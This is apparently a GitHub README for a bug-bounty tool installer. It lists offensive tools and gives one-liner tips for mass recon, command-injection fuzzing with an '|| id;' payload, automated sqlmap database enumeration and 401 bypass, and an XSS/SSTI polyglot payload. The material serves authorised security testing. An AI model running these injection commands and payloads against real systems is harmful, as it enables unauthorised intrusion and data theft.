# Awesome Bug Bounty Builder

[![contributions welcome](https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat)](https://github.com/0xJin/awesome-bugbounty-builder/issues)


Awesome Bug bounty builder Project


![bb](https://user-images.githubusercontent.com/81621963/147457586-79ac41eb-f995-455b-a144-f80a5783047a.PNG)


---

### Installation

```
$ git clone https://github.com/0xJin/awesome-bugbounty-builder.git
$ cd awesome-bugbounty-builder/
$ chmod +x awesome-bugbounty-builder.sh
$ ./awesome-bugbounty-builder.sh
```


### Which tools You will find here

> Amass -
> Sublister -
> Gauplus -
> httpx -
> gf + patterns -
> kxss -
> sqlmap -
> commix -
> tplmap -
> hydra -
> john the ripper -
> evilwinrm -
> Arjun -
> Paramspider -
> NoSQLmap -
> NMAP -
> nikto -
> FFUF -
> 403-Bypass -
> Gobuster -
> Seclists -
> Hash-identifier -
> XSSMAP -
> Smuggler -
> SSRFmap -
> gmapsapiscanner -
> qsreplace -
> exiftool -
> XSRFProbe 

---


### Bug Bounty TIPS and Usage of tools + One Liner TIPS


# ONE-LINER *RECON* for FUZZ XSS

```
$ amass enum -brute -passive -d example.com | httpx -silent -status-code | tee domain.txt
$ cat domain.txt | gauplus -random-agent -t 200 | gf xss | kxss | tee domain2.txt
```

---


# FUZZ all SUBDOMAINS with *FUFF* ONE-LINER

```
$ amass enum -brute -passive -d http://example.com | sed 's#*.# #g' | httpx -silent -threads 10 | xargs -I@ sh -c 'ffuf -w wordlist.txt -u @/FUZZ -mc 200'
```

---


# COMMAND Injection with *FUFF* ONE-LINER

```
$ cat subdomains.txt | httpx -silent -status-code | gauplus -random-agent -t 200 | qsreplace “aaa%20%7C%7C%20id%3B%20x” > fuzzing.txt
$ ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080
// search for ”uid” in burp proxy intercept 
// You can use the same query for search SSTI in qsreplase add "{{7*7}}" and search on burp for '49'
```


---


# SQL Injection Tips

```
// MASS SQL injection
$ amass enum -brute -passive -d example.com | httpx -silent -status-code | tee domain.txt
$ cat domain.txt | gauplus -random-agent -t 200 | gf sqli | tee domain2.txt
$ sqlmap -m domain2.txt -dbs --batch --random-agent
// SQL Injection headers:
$ sqlmap -u "http://redacted.com" --header="X-Forwarded-For: 1*" --dbs --batch --random-agent --threads=10
// SQL Injection bypass 401
$ sqlmap -u "http://redacted.com" --dbs --batch --random-agent --forms --ignore-code=401
```

---


# XSS + SQLi + CSTI/SSTI

```
Payload: '"><svg/onload=prompt(5);>{{7*7}}
```


---


